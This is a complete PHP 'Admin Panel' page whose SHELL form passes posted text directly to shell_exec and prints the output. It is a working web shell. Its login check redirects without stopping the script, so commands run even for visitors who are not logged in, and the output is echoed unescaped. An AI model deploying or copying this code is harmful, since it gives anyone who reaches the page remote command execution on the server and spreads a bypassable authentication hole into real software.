 <?php
session_start();
if($_SESSION['status']!="1"){
	header("Location: /404.php");
}
?>
<html>
  <head>
    <title>Admin Panel</title>
    <link rel="stylesheet" type="text/css" href="style.css">
    <meta HTTP-EQUIV="refresh" CONTENT="300;URL=logout.php">
  </head>
  <body>
    <h1 style="text-align:center;">Admin Panel</h1>
    <a href="logout.php">Logout</a>&ensp;
    <a href="options.php">Home</a><hr>

    <form action="" name="query" id="query" method="post">
    	SHELL: &nbsp;&nbsp;&ensp;&nbsp;&nbsp;<input type="text" id="query_box" name="query_box" placeholder="Ex: whoami"></input><br><br>   
    	<button type="Submit" value="Submit">Submit</button>
    </form>
<script>
var input = document.getElementById('query_box');
input.focus();
input.select();
</script>


<?php
$cwd=getcwd();
echo "<br>Current directory: $cwd<br>";
$shell = $_POST['query_box'];
if (!empty($_POST['query_box'])) {
	//Run the shell command
	$run = shell_exec("$shell");
	echo "<br><b>Output: </b><br>";
	echo "<pre>$run</pre>";
}else{
	echo "<b>Nothing has been run yet.</b>";	
}
?>  
</body>
</html>
